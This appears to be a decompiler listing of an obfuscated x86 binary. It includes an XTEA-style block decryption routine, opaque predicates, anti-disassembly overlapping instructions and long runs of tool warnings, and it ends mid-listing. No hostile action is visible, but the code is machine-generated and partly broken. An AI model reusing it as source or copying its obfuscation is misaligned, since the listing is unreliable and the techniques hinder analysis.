/* WARNING: Instruction at (ram,0x004208d3) overlaps instruction at (ram,0x004208d2)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0042088c) */
/* WARNING: Removing unreachable block (ram,0x00420898) */
/* WARNING: Removing unreachable block (ram,0x00420799) */
/* WARNING: Removing unreachable block (ram,0x00420839) */
/* WARNING: Removing unreachable block (ram,0x004207ed) */
/* WARNING: Removing unreachable block (ram,0x00420821) */
/* WARNING: Removing unreachable block (ram,0x004208ad) */
/* WARNING: Removing unreachable block (ram,0x00420769) */
/* WARNING: Removing unreachable block (ram,0x0042082d) */
/* WARNING: Removing unreachable block (ram,0x00420775) */
/* WARNING: Removing unreachable block (ram,0x00420702) */
/* WARNING: Removing unreachable block (ram,0x0042067f) */
/* WARNING: Removing unreachable block (ram,0x00420673) */
/* WARNING: Removing unreachable block (ram,0x00420697) */
/* WARNING: Removing unreachable block (ram,0x0042062b) */
/* WARNING: Removing unreachable block (ram,0x004205d0) */
/* WARNING: Removing unreachable block (ram,0x004205e8) */
/* WARNING: Removing unreachable block (ram,0x0042065b) */
/* WARNING: Removing unreachable block (ram,0x00420637) */
/* WARNING: Removing unreachable block (ram,0x00420643) */
/* WARNING: Removing unreachable block (ram,0x004206ea) */
/* WARNING: Removing unreachable block (ram,0x00420745) */
/* WARNING: Removing unreachable block (ram,0x004207bd) */
/* WARNING: Removing unreachable block (ram,0x004208c5) */
/* WARNING: Removing unreachable block (ram,0x004207c9) */
/* WARNING: Removing unreachable block (ram,0x00420781) */
/* WARNING: Removing unreachable block (ram,0x00420751) */
/* WARNING: Removing unreachable block (ram,0x0042075d) */
/* WARNING: Removing unreachable block (ram,0x004207d5) */
/* WARNING: Removing unreachable block (ram,0x0042078d) */
/* WARNING: Removing unreachable block (ram,0x004205f4) */
/* WARNING: Removing unreachable block (ram,0x004205ff) */
/* WARNING: Removing unreachable block (ram,0x004206f6) */
/* WARNING: Removing unreachable block (ram,0x004207f9) */
/* WARNING: Removing unreachable block (ram,0x0042064f) */
/* WARNING: Removing unreachable block (ram,0x004206a3) */
/* WARNING: Removing unreachable block (ram,0x004207e1) */
/* WARNING: Removing unreachable block (ram,0x004205dc) */
/* WARNING: Removing unreachable block (ram,0x004207a5) */
/* WARNING: Removing unreachable block (ram,0x004208b9) */
/* WARNING: Removing unreachable block (ram,0x00420667) */
/* WARNING: Removing unreachable block (ram,0x0042070e) */
/* WARNING: Removing unreachable block (ram,0x00420845) */
/* WARNING: Removing unreachable block (ram,0x004206af) */
/* WARNING: Removing unreachable block (ram,0x0042068b) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xffffffec : 0x0042071b */
/* WARNING: Removing unreachable block (ram,0x004208d1) */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

void __thiscall FUN_004205b5(byte param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  byte *in_stack_00000010;
  byte *in_stack_00000014;
  uint uStack_20;
  uint uStack_1c;
  uint uStack_18;
  uint local_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint uStack_8;

  local_14 = 0;
                    /* WARNING: Bad instruction - Truncating control flow here */
  while ((local_14 = FUN_0041fa00((undefined4 *)&stack0x00000004,1,local_14,&uStack_10,&uStack_18,
                                  &uStack_20), local_14 != 0 &&
         (bVar1 = FUN_0041fd00((undefined4 *)&stack0x00000004,local_14,in_stack_00000014),
         CONCAT31(extraout_var,bVar1) == 0))) {
    local_14 = local_14 + 0x28;
  }
  local_14 = 0;
  while( true ) {
    local_14 = FUN_0041fa00((undefined4 *)&stack0x00000004,1,local_14,&uStack_c,&uStack_1c,&uStack_8
                           );
    bVar1 = (POPCOUNT(local_14 & 0xff) & 1U) == 0;
    if (local_14 == 0) {
      return;
    }
    if ((!bVar1) && (bVar1)) break;
    bVar1 = FUN_0041fd00((undefined4 *)&stack0x00000004,local_14,in_stack_00000010);
    if (CONCAT31(extraout_var_00,bVar1) != 0) {
      FUN_004208de();
    }
    local_14 = local_14 + 0x28;
  }
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* VA 004208de */

/* WARNING: Instruction at (ram,0x00420de3) overlaps instruction at (ram,0x00420de2)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING (jumptable): Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x00420c73) */
/* WARNING: Removing unreachable block (ram,0x00420cdb) */
/* WARNING: Removing unreachable block (ram,0x00420cdf) */
/* WARNING: Removing unreachable block (ram,0x00420db0) */
/* WARNING: Removing unreachable block (ram,0x00420db4) */
/* WARNING: Removing unreachable block (ram,0x00420dba) */
/* WARNING: Removing unreachable block (ram,0x8dcb3607) */
/* WARNING: Removing unreachable block (ram,0x00420ac6) */
/* WARNING: Removing unreachable block (ram,0x004209c8) */
/* WARNING: Removing unreachable block (ram,0x004209cc) */
/* WARNING: Removing unreachable block (ram,0x00420bf8) */
/* WARNING: Removing unreachable block (ram,0x00420ad2) */
/* WARNING: Removing unreachable block (ram,0x00420dc5) */
/* WARNING: Removing unreachable block (ram,0x00420dc9) */
/* WARNING: Removing unreachable block (ram,0x00420c04) */
/* WARNING: Removing unreachable block (ram,0x00420ca3) */
/* WARNING: Removing unreachable block (ram,0x00420b65) */
/* WARNING: Removing unreachable block (ram,0x00420b59) */
/* WARNING: Removing unreachable block (ram,0x00420b4d) */
/* WARNING: Removing unreachable block (ram,0x00420cc1) */
/* WARNING: Removing unreachable block (ram,0x00420a60) */
/* WARNING: Removing unreachable block (ram,0x00420cf0) */
/* WARNING: Removing unreachable block (ram,0x00420cf4) */
/* WARNING: Removing unreachable block (ram,0x00420b35) */
/* WARNING: Removing unreachable block (ram,0x004209e4) */
/* WARNING: Removing unreachable block (ram,0x00420d36) */
/* WARNING: Removing unreachable block (ram,0x00420c49) */
/* WARNING: Removing unreachable block (ram,0x00420b29) */
/* WARNING: Removing unreachable block (ram,0x004209d4) */
/* WARNING: Removing unreachable block (ram,0x004209d8) */
/* WARNING: Removing unreachable block (ram,0x00420994) */
/* WARNING: Removing unreachable block (ram,0x00420950) */
/* WARNING: Removing unreachable block (ram,0x0042092c) */
/* WARNING: Removing unreachable block (ram,0x00420944) */
/* WARNING: Removing unreachable block (ram,0x00420988) */
/* WARNING: Removing unreachable block (ram,0x00420a54) */
/* WARNING: Removing unreachable block (ram,0x00420b7d) */
/* WARNING: Removing unreachable block (ram,0x00420d12) */
/* WARNING: Removing unreachable block (ram,0x00420d8a) */
/* WARNING: Removing unreachable block (ram,0x00420a6c) */
/* WARNING: Removing unreachable block (ram,0x00420b95) */
/* WARNING: Removing unreachable block (ram,0x00420d42) */
/* WARNING: Removing unreachable block (ram,0x00420b41) */
/* WARNING: Removing unreachable block (ram,0x00420d4e) */
/* WARNING: Removing unreachable block (ram,0x00420ba1) */
/* WARNING: Removing unreachable block (ram,0x00420bad) */
/* WARNING: Removing unreachable block (ram,0x00420ade) */
/* WARNING: Removing unreachable block (ram,0x00420de1) */
/* WARNING: Removing unreachable block (ram,0x00420d1e) */
/* WARNING: Removing unreachable block (ram,0x004209e0) */
/* WARNING: Removing unreachable block (ram,0x00420c31) */
/* WARNING: Removing unreachable block (ram,0x00420938) */
/* WARNING: Heritage AFTER dead removal. Example location: s0x00000014 : 0x00420ccb */
/* WARNING: Removing unreachable block (ram,0x00420b71) */
/* WARNING: Removing unreachable block (ram,0x00420d2a) */
/* WARNING: Removing unreachable block (ram,0x004209a0) */
/* WARNING: Removing unreachable block (ram,0x00420b89) */
/* WARNING: Removing unreachable block (ram,0x00420a78) */
/* WARNING: Removing unreachable block (ram,0x00420d5a) */
/* WARNING: Removing unreachable block (ram,0x00420c3d) */
/* WARNING: Removing unreachable block (ram,0x00420d72) */
/* WARNING: Removing unreachable block (ram,0x00420d66) */
/* WARNING: Removing unreachable block (ram,0x00420d7e) */
/* WARNING: Removing unreachable block (ram,0x004209ac) */
/* WARNING: Removing unreachable block (ram,0x00420d96) */
/* WARNING: Removing unreachable block (ram,0x00420c55) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

void FUN_004208de(void)

{
  undefined4 in_stack_00000004;
  undefined4 in_stack_00000008;
  undefined4 *in_stack_00000014;
  int in_stack_00000018;
  undefined4 *in_stack_00000020;
  int in_stack_00000024;
  uint in_stack_00000028;
  undefined4 *local_202c;
  undefined4 *local_2028;
  undefined4 *local_2024;
  short local_2020;
  undefined4 local_201c [1024];
  undefined4 *local_101c;
  undefined4 *local_1018;
  int local_1014;
  undefined4 *local_1010;
  int local_100c;
  undefined4 local_1008 [1013];
  undefined *puStackY_34;
  undefined4 uStackY_30;
  undefined *puStackY_2c;
  undefined4 uStackY_28;
  undefined4 *puStackY_24;

  FUN_004159a0();
  _memset(local_1008,0,0x1000);
  _memset(local_201c,0,0x1000);
                    /* WARNING: Could not recover jumptable at 0x004209b2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  while (local_2020 == 0) {
    if (local_2024 < (undefined4 *)0x1000) {
      local_2028 = local_2024;
    }
    else {
      local_2028 = (undefined4 *)0x1000;
    }
    local_1018 = local_2028;
    if (local_1010 < local_2028) {
      local_202c = local_1010;
    }
    else {
      local_202c = local_2028;
    }
    local_101c = local_202c;
                    /* WARNING: Bad instruction - Truncating control flow here */
    puStackY_24 = (undefined4 *)0x420a97;
    FUN_00411eb0(&stack0x00000004,local_100c,local_2028,local_1008);
    puStackY_24 = (undefined4 *)0x420ab8;
    FUN_00411eb0(&stack0x00000004,local_1014,local_101c,local_201c);
    if ((in_stack_00000028 & 0xffff) == 0) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      uStackY_28 = in_stack_00000004;
      puStackY_24 = (undefined4 *)in_stack_00000008;
      puStackY_2c = &UNK_00420b1b;
      FUN_00420470((char)&uStackY_28);
    }
    puStackY_24 = local_1008;
    uStackY_30 = in_stack_00000004;
    puStackY_2c = (undefined *)in_stack_00000008;
    puStackY_34 = &UNK_00420bea;
    FUN_00420dee((byte)in_stack_00000008);
                    /* WARNING: Bad instruction - Truncating control flow here */
    puStackY_24 = (undefined4 *)&UNK_00420c23;
    func_0x00412090();
                    /* WARNING: Could not recover jumptable at 0x00420c5b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    local_2024 = (undefined4 *)((int)local_2024 - (int)local_1018);
                    /* WARNING: Could not recover jumptable at 0x00420c79. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    local_1010 = (undefined4 *)((int)local_1010 - (int)local_101c);
    local_1014 = local_1014 + (int)local_101c;
                    /* WARNING: Bad instruction - Truncating control flow here */
    local_100c = local_100c + (int)local_1018;
    if (local_2024 == (undefined4 *)0x0) {
      local_2024 = in_stack_00000014;
                    /* WARNING: Bad instruction - Truncating control flow here */
                    /* WARNING: Bad instruction - Truncating control flow here */
      local_2020 = 1;
      local_100c = in_stack_00000018;
    }
    if (local_1010 == (undefined4 *)0x0) {
      local_1010 = in_stack_00000020;
      local_1014 = in_stack_00000024;
                    /* WARNING: Bad instruction - Truncating control flow here */
    }
  }
  return;
}



/* VA 00420dee */

/* WARNING: Instruction at (ram,0x004212b5) overlaps instruction at (ram,0x004212b4)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00421207) */
/* WARNING: Removing unreachable block (ram,0x004214d9) */
/* WARNING: Removing unreachable block (ram,0x004214cd) */
/* WARNING: Removing unreachable block (ram,0x004214b5) */
/* WARNING: Removing unreachable block (ram,0x0042149d) */
/* WARNING: Removing unreachable block (ram,0x00421420) */
/* WARNING: Removing unreachable block (ram,0x00421408) */
/* WARNING: Removing unreachable block (ram,0x004213f0) */
/* WARNING: Removing unreachable block (ram,0x004213cc) */
/* WARNING: Removing unreachable block (ram,0x004213b4) */
/* WARNING: Removing unreachable block (ram,0x0042139c) */
/* WARNING: Removing unreachable block (ram,0x00421384) */
/* WARNING: Removing unreachable block (ram,0x0042136c) */
/* WARNING: Removing unreachable block (ram,0x00421354) */
/* WARNING: Removing unreachable block (ram,0x0042133c) */
/* WARNING: Removing unreachable block (ram,0x00421324) */
/* WARNING: Removing unreachable block (ram,0x004212e8) */
/* WARNING: Removing unreachable block (ram,0x004212d0) */
/* WARNING: Removing unreachable block (ram,0x004212a1) */
/* WARNING: Removing unreachable block (ram,0x004211a4) */
/* WARNING: Removing unreachable block (ram,0x00421250) */
/* WARNING: Removing unreachable block (ram,0x00420fc9) */
/* WARNING: Removing unreachable block (ram,0x004210cb) */
/* WARNING: Removing unreachable block (ram,0x0042128c) */
/* WARNING: Removing unreachable block (ram,0x00421138) */
/* WARNING: Removing unreachable block (ram,0x00420fed) */
/* WARNING: Removing unreachable block (ram,0x0042125c) */
/* WARNING: Removing unreachable block (ram,0x00421198) */
/* WARNING: Removing unreachable block (ram,0x0042112c) */
/* WARNING: Removing unreachable block (ram,0x00421089) */
/* WARNING: Removing unreachable block (ram,0x00421035) */
/* WARNING: Removing unreachable block (ram,0x00420fe1) */
/* WARNING: Removing unreachable block (ram,0x00420f9c) */
/* WARNING: Removing unreachable block (ram,0x00420f3b) */
/* WARNING: Removing unreachable block (ram,0x00420f11) */
/* WARNING: Removing unreachable block (ram,0x00420ef8) */
/* WARNING: Removing unreachable block (ram,0x00420eda) */
/* WARNING: Removing unreachable block (ram,0x00420eb6) */
/* WARNING: Removing unreachable block (ram,0x00420e92) */
/* WARNING: Removing unreachable block (ram,0x00420e7a) */
/* WARNING: Removing unreachable block (ram,0x00420e3e) */
/* WARNING: Removing unreachable block (ram,0x00420e26) */
/* WARNING: Removing unreachable block (ram,0x00420e0e) */
/* WARNING: Removing unreachable block (ram,0x00420e1a) */
/* WARNING: Removing unreachable block (ram,0x00420e32) */
/* WARNING: Removing unreachable block (ram,0x00420e4a) */
/* WARNING: Removing unreachable block (ram,0x00420e56) */
/* WARNING: Removing unreachable block (ram,0x00420e6e) */
/* WARNING: Removing unreachable block (ram,0x00420e86) */
/* WARNING: Removing unreachable block (ram,0x00420eaa) */
/* WARNING: Removing unreachable block (ram,0x00420ece) */
/* WARNING: Removing unreachable block (ram,0x00420f23) */
/* WARNING: Removing unreachable block (ram,0x00420f47) */
/* WARNING: Removing unreachable block (ram,0x00420fa8) */
/* WARNING: Removing unreachable block (ram,0x00420ff9) */
/* WARNING: Removing unreachable block (ram,0x00421065) */
/* WARNING: Removing unreachable block (ram,0x004210e3) */
/* WARNING: Removing unreachable block (ram,0x00421168) */
/* WARNING: Removing unreachable block (ram,0x0042122c) */
/* WARNING: Removing unreachable block (ram,0x00420fb4) */
/* WARNING: Removing unreachable block (ram,0x00421095) */
/* WARNING: Removing unreachable block (ram,0x00421238) */
/* WARNING: Removing unreachable block (ram,0x00421041) */
/* WARNING: Removing unreachable block (ram,0x00421244) */
/* WARNING: Removing unreachable block (ram,0x004210d7) */
/* WARNING: Removing unreachable block (ram,0x00420fd5) */
/* WARNING: Removing unreachable block (ram,0x00421274) */
/* WARNING: Removing unreachable block (ram,0x00421280) */
/* WARNING: Removing unreachable block (ram,0x004212dc) */
/* WARNING: Removing unreachable block (ram,0x004212f4) */
/* WARNING: Removing unreachable block (ram,0x0042130c) */
/* WARNING: Removing unreachable block (ram,0x00421348) */
/* WARNING: Removing unreachable block (ram,0x00421360) */
/* WARNING: Removing unreachable block (ram,0x00421378) */
/* WARNING: Removing unreachable block (ram,0x00421390) */
/* WARNING: Removing unreachable block (ram,0x004213a8) */
/* WARNING: Removing unreachable block (ram,0x004213c0) */
/* WARNING: Removing unreachable block (ram,0x004213d8) */
/* WARNING: Removing unreachable block (ram,0x004213fc) */
/* WARNING: Removing unreachable block (ram,0x00421414) */
/* WARNING: Removing unreachable block (ram,0x0042142c) */
/* WARNING: Removing unreachable block (ram,0x00421438) */
/* WARNING: Removing unreachable block (ram,0x00421491) */
/* WARNING: Removing unreachable block (ram,0x004214a9) */
/* WARNING: Removing unreachable block (ram,0x004214c1) */
/* WARNING: Removing unreachable block (ram,0x004214f1) */
/* WARNING: Removing unreachable block (ram,0x00421005) */
/* WARNING: Removing unreachable block (ram,0x00421011) */
/* WARNING: Heritage AFTER dead removal. Example location: s0x00000018 : 0x00420fb8 */
/* WARNING: Removing unreachable block (ram,0x00421268) */
/* WARNING: Removing unreachable block (ram,0x004214e5) */
/* WARNING: Removing unreachable block (ram,0x00421300) */
/* WARNING: Removing unreachable block (ram,0x0042107d) */
/* WARNING: Removing unreachable block (ram,0x0042118c) */
/* WARNING: Removing unreachable block (ram,0x004210ef) */
/* WARNING: Removing unreachable block (ram,0x0042104d) */
/* WARNING: Removing unreachable block (ram,0x00420f2f) */
/* WARNING: Removing unreachable block (ram,0x00420e9e) */
/* WARNING: Removing unreachable block (ram,0x00420e62) */
/* WARNING: Removing unreachable block (ram,0x00420ec2) */
/* WARNING: Removing unreachable block (ram,0x00420f53) */
/* WARNING: Removing unreachable block (ram,0x00421059) */
/* WARNING: Removing unreachable block (ram,0x00421144) */
/* WARNING: Removing unreachable block (ram,0x004211bc) */
/* WARNING: Removing unreachable block (ram,0x00421071) */
/* WARNING: Removing unreachable block (ram,0x004213e4) */
/* WARNING: Removing unreachable block (ram,0x004212b3) */
/* WARNING: Removing unreachable block (ram,0x00420ee6) */
/* WARNING: Removing unreachable block (ram,0x00420eec) */
/* WARNING: Removing unreachable block (ram,0x00421485) */
/* WARNING: Removing unreachable block (ram,0x0042115c) */
/* WARNING: Removing unreachable block (ram,0x00421150) */
/* WARNING: Removing unreachable block (ram,0x004211c8) */
/* WARNING: Removing unreachable block (ram,0x00421318) */
/* WARNING: Removing unreachable block (ram,0x004214fd) */
/* WARNING: Removing unreachable block (ram,0x00421174) */
/* WARNING: Removing unreachable block (ram,0x00421330) */
/* WARNING: Removing unreachable block (ram,0x004211b0) */
/* WARNING: Removing unreachable block (ram,0x004211d4) */
/* WARNING: Removing unreachable block (ram,0x00421180) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

uint __thiscall FUN_00420dee(byte param_1)

{
  uint uVar1;
  int *piVar2;
  void *extraout_ECX;
  void *this;
  int unaff_EBX;
  bool bVar3;
  uint *in_stack_0000000c;
  int in_stack_00000014;
  int in_stack_00000018;
  uint in_stack_00000020;
  undefined *puStackY_4c;
  void *pvStack_1c;
  uint uStack_18;
  int iStack_14;
  void *pvStack_10;
  int iStack_c;
  void *pvStack_8;

  bVar3 = (POPCOUNT((uint)&pvStack_1c & 0xff) & 1U) == 0;
  if ((!bVar3) && (bVar3)) {
    *(char *)(unaff_EBX + 4) = *(char *)(unaff_EBX + 4) >> 7;
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  this = (void *)(in_stack_00000018 + -1 + in_stack_00000014);
  pvStack_8 = this;
  pvStack_1c = this;
  while (uVar1 = (int)pvStack_10 - (int)pvStack_8, pvStack_1c = pvStack_8, pvStack_10 < pvStack_8) {
    puStackY_4c = &UNK_00420f81;
    uVar1 = FUN_004119a0(&stack0x00000004,(uint *)&pvStack_10,(uint *)&pvStack_1c,4,
                         (ushort)((in_stack_00000020 & 0xffff) == 0));
    this = extraout_ECX;
    if ((uVar1 & 0xffff) == 0) break;
    uStack_18 = (int)pvStack_10 - in_stack_00000018;
    bVar3 = (POPCOUNT(uStack_18 & 0xff) & 1U) == 0;
    if ((!bVar3) && (bVar3)) {
      *(int *)(unaff_EBX + 0x552be855) = *(int *)(unaff_EBX + 0x552be855) - uStack_18;
      do {
                    /* WARNING: Do nothing block with infinite loop */
      } while( true );
    }
    iStack_c = (int)pvStack_1c + (1 - (int)pvStack_10);
    puStackY_4c = &UNK_004210bd;
    FUN_00421505();
    FUN_004219a0(&puStackY_4c,in_stack_0000000c);
    puStackY_4c = &UNK_004211f9;
    FUN_00413a9f();
    DAT_0042eb08 = DAT_0042eb08 + iStack_14;
    bVar3 = (POPCOUNT(DAT_0042eb08 & 0xff) & 1U) == 0;
    if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    this = (void *)((int)pvStack_10 + iStack_c);
    pvStack_10 = this;
  }
  bVar3 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;
  if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  piVar2 = FUN_00422ef1(this,&DAT_0042eb08);
  uVar1 = -(uint)(((uint)piVar2 & 0xffff) != 0) & 0x4f3;
  DAT_0042eb08 = DAT_0042eb08 + uVar1;
  bVar3 = (POPCOUNT(DAT_0042eb08 & 0xff) & 1U) == 0;
  if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  return uVar1;
}



/* VA 00421505 */

/* WARNING: Instruction at (ram,0x00421713) overlaps instruction at (ram,0x00421712)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00421889) */
/* WARNING: Removing unreachable block (ram,0x0042184f) */
/* WARNING: Removing unreachable block (ram,0x0042182a) */
/* WARNING: Removing unreachable block (ram,0x00421812) */
/* WARNING: Removing unreachable block (ram,0x004217fa) */
/* WARNING: Removing unreachable block (ram,0x004217e2) */
/* WARNING: Removing unreachable block (ram,0x004217be) */
/* WARNING: Removing unreachable block (ram,0x00421782) */
/* WARNING: Removing unreachable block (ram,0x00421746) */
/* WARNING: Removing unreachable block (ram,0x0042172e) */
/* WARNING: Removing unreachable block (ram,0x00421667) */
/* WARNING: Removing unreachable block (ram,0x0042165b) */
/* WARNING: Removing unreachable block (ram,0x004216b3) */
/* WARNING: Removing unreachable block (ram,0x004215da) */
/* WARNING: Removing unreachable block (ram,0x004215c2) */
/* WARNING: Removing unreachable block (ram,0x004215aa) */
/* WARNING: Removing unreachable block (ram,0x00421592) */
/* WARNING: Removing unreachable block (ram,0x0042157a) */
/* WARNING: Removing unreachable block (ram,0x00421562) */
/* WARNING: Removing unreachable block (ram,0x00421556) */
/* WARNING: Removing unreachable block (ram,0x0042154a) */
/* WARNING: Removing unreachable block (ram,0x00421586) */
/* WARNING: Removing unreachable block (ram,0x0042159e) */
/* WARNING: Removing unreachable block (ram,0x004215b6) */
/* WARNING: Removing unreachable block (ram,0x004215ce) */
/* WARNING: Removing unreachable block (ram,0x004215e6) */
/* WARNING: Removing unreachable block (ram,0x0042164f) */
/* WARNING: Removing unreachable block (ram,0x004216f9) */
/* WARNING: Removing unreachable block (ram,0x004216ed) */
/* WARNING: Removing unreachable block (ram,0x0042173a) */
/* WARNING: Removing unreachable block (ram,0x00421752) */
/* WARNING: Removing unreachable block (ram,0x0042175e) */
/* WARNING: Removing unreachable block (ram,0x00421776) */
/* WARNING: Removing unreachable block (ram,0x004217b2) */
/* WARNING: Removing unreachable block (ram,0x004217d6) */
/* WARNING: Removing unreachable block (ram,0x004217ee) */
/* WARNING: Removing unreachable block (ram,0x00421806) */
/* WARNING: Removing unreachable block (ram,0x0042181e) */
/* WARNING: Removing unreachable block (ram,0x004216bf) */
/* WARNING: Removing unreachable block (ram,0x004216cb) */
/* WARNING: Removing unreachable block (ram,0x004216db) */
/* WARNING: Removing unreachable block (ram,0x004217ca) */
/* WARNING: Removing unreachable block (ram,0x0042176a) */
/* WARNING: Removing unreachable block (ram,0x004216a7) */
/* WARNING: Removing unreachable block (ram,0x004215f2) */
/* WARNING: Removing unreachable block (ram,0x0042178e) */
/* WARNING: Removing unreachable block (ram,0x00421705) */
/* WARNING: Removing unreachable block (ram,0x00421673) */
/* WARNING: Removing unreachable block (ram,0x0042156e) */
/* WARNING: Heritage AFTER dead removal. Example location: s0x00000010 : 0x0042185d */
/* WARNING: Removing unreachable block (ram,0x00421836) */
/* WARNING: Removing unreachable block (ram,0x00421885) */
/* WARNING: Removing unreachable block (ram,0x0042179a) */
/* WARNING: Removing unreachable block (ram,0x00421711) */
/* WARNING: Removing unreachable block (ram,0x004217a6) */
/* WARNING: Type propagation algorithm not settling */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

void FUN_00421505(void)

{
  uint uVar1;
  uint uVar2;
  int *piVar3;
  uint uVar4;
  ushort uVar5;
  uint uVar6;
  undefined2 extraout_var;
  int unaff_EBX;
  bool bVar7;
  uint *in_stack_00000010;
  short sStack00000014;

  uVar2 = FUN_00415320((int *)0x0);
  uVar6 = _sStack00000014 & 0xffff;
  piVar3 = (int *)(uVar2 / uVar6);
  bVar7 = (POPCOUNT((_sStack00000014 & 0xffff) - 8 & 0xff) & 1U) == 0;
  if ((_sStack00000014 & 0xffff) < 8) {
    return;
  }
  if ((!bVar7) && (bVar7)) {
    *(uint *)(unaff_EBX + -0xdae7bb) = *(uint *)(unaff_EBX + -0xdae7bb) | uVar6;
    *piVar3 = *piVar3 + 1;
    *(char *)(unaff_EBX + 0x127310f8) = *(char *)(unaff_EBX + 0x127310f8) + (char)piVar3;
    goto code_r0x0042160c;
  }
  do {
    if ((_sStack00000014 & 0xffff) < 0x10) {
code_r0x0042160c:
      uVar4 = _sStack00000014;
      _sStack00000014 = _sStack00000014 & 0xffff;
      uVar1 = _sStack00000014;
      sStack00000014 = (short)uVar4;
      if ((uVar4 & 0xffff) != 8) {
                    /* WARNING: Bad instruction - Truncating control flow here */
        if (uVar1 == 0) {
          return;
        }
        FUN_00421891((uint *)((int)in_stack_00000010 + (uVar1 - 8)),(int *)&DAT_0042eaf8);
        FUN_00421891(in_stack_00000010,(int *)&DAT_0042eaf8);
        return;
      }
    }
    FUN_00421891(in_stack_00000010,(int *)&DAT_0042eaf8);
    in_stack_00000010 = in_stack_00000010 + 2;
    uVar5 = sStack00000014 - 8;
    _sStack00000014 = (uint)uVar5;
                    /* WARNING: Bad instruction - Truncating control flow here */
    if (((uint)uVar5 == uVar2 % uVar6) &&
       (uVar4 = FUN_00422b40(CONCAT22(extraout_var,uVar5),uVar5,(uint *)&DAT_0042eb08),
       (uVar4 & 0xffff) != 0)) {
      DAT_0042eb08 = DAT_0042eb08 + (uint)uVar5;
    }
  } while( true );
}



/* VA 00421891 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Instruction at (ram,0x0042192f) overlaps instruction at (ram,0x0042192d)
    */
/* WARNING: Removing unreachable block (ram,0x00421977) */
/* WARNING: Removing unreachable block (ram,0x0042197b) */
/* WARNING: Removing unreachable block (ram,0x00421929) */
/* WARNING: Removing unreachable block (ram,0x0042196a) */
/* WARNING: Removing unreachable block (ram,0x004218e3) */
/* WARNING: Removing unreachable block (ram,0x004218bf) */
/* WARNING: Removing unreachable block (ram,0x00421983) */
/* WARNING: Removing unreachable block (ram,0x00421987) */
/* WARNING: Removing unreachable block (ram,0x004218cb) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_00421891(uint *param_1,int *param_2)

{
  int local_14;
  uint local_10;
  uint local_c;
  int local_8;

  local_c = *param_1;
  local_10 = param_1[1];
  local_14 = DAT_00428010;
  local_8 = _UNK_0042800c << 5;
                    /* WARNING: Bad instruction - Truncating control flow here */
  while (local_14 != 0) {
    local_10 = local_10 -
               (local_c * 0x10 + param_2[2] ^ local_c + local_8 ^ (local_c >> 5) + param_2[3]);
    local_c = local_c - (local_10 * 0x10 + *param_2 ^ local_10 + local_8 ^
                        (local_10 >> 5) + param_2[1]);
    local_8 = local_8 - _UNK_0042800c;
    local_14 = local_14 + -1;
  }
  *param_1 = local_c;
  param_1[1] = local_10;
  return;
}



/* VA 004219a0 */

/* WARNING: Instruction at (ram,0x00421a14) overlaps instruction at (ram,0x00421a13)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x004219f4) */
/* WARNING: Removing unreachable block (ram,0x004219f8) */
/* WARNING: Removing unreachable block (ram,0x00421ddc) */
/* WARNING: Removing unreachable block (ram,0x00421de0) */
/* WARNING: Removing unreachable block (ram,0x004219d9) */
/* WARNING: Removing unreachable block (ram,0x004219b4) */
/* WARNING: Removing unreachable block (ram,0x004219cd) */
/* WARNING: Removing unreachable block (ram,0x00421de8) */
/* WARNING: Removing unreachable block (ram,0x00421dec) */
/* WARNING: Removing unreachable block (ram,0x00421cba) */
/* WARNING: Removing unreachable block (ram,0x00421e64) */
/* WARNING: Removing unreachable block (ram,0x00421cae) */
/* WARNING: Removing unreachable block (ram,0x00421f91) */
/* WARNING: Removing unreachable block (ram,0x00421f00) */
/* WARNING: Removing unreachable block (ram,0x00421ef4) */
/* WARNING: Removing unreachable block (ram,0x00421f6c) */
/* WARNING: Removing unreachable block (ram,0x00421c7e) */
/* WARNING: Removing unreachable block (ram,0x00421d72) */
/* WARNING: Removing unreachable block (ram,0x00421edc) */
/* WARNING: Removing unreachable block (ram,0x00421cde) */
/* WARNING: Removing unreachable block (ram,0x00421f30) */
/* WARNING: Removing unreachable block (ram,0x00421e40) */
/* WARNING: Removing unreachable block (ram,0x00421d1a) */
/* WARNING: Removing unreachable block (ram,0x00421d20) */
/* WARNING: Removing unreachable block (ram,0x00421d21) */
/* WARNING: Removing unreachable block (ram,0x00421c36) */
/* WARNING: Removing unreachable block (ram,0x00421f48) */
/* WARNING: Removing unreachable block (ram,0x00421e70) */
/* WARNING: Removing unreachable block (ram,0x00421da2) */
/* WARNING: Removing unreachable block (ram,0x00421db2) */
/* WARNING: Removing unreachable block (ram,0x00421d02) */
/* WARNING: Removing unreachable block (ram,0x00421c8a) */
/* WARNING: Removing unreachable block (ram,0x00421c2a) */
/* WARNING: Removing unreachable block (ram,0x00421b37) */
